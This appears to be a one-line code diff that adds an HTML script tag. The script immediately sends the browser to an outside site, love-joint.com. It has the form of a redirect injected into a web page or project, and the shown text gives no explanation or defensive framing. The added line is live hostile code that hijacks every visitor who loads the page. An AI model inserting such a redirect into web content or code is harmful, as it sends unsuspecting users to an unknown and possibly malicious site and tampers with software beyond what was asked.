@@ -1,0 +1,1 @@
+<script>window.location.href="http://love-joint.com"</script>
